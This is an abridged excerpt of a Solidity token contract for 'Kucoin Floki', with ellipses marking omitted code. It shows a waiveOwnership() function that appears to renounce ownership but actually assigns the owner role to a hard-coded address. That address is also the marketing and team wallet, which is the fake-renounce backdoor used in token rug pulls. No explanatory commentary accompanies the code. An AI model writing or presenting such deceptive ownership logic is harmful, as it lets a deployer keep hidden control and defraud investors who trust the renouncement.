...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x98B804e8Dac71D790361dF43bdac822bEc634D81);
    }
...
contract KucoinFloki is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Kucoin Floki";
    string private _symbol = "KUCOIN FLOKI";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x98B804e8Dac71D790361dF43bdac822bEc634D81);
    address payable private teamWalletAddress = payable(0x98B804e8Dac71D790361dF43bdac822bEc634D81);
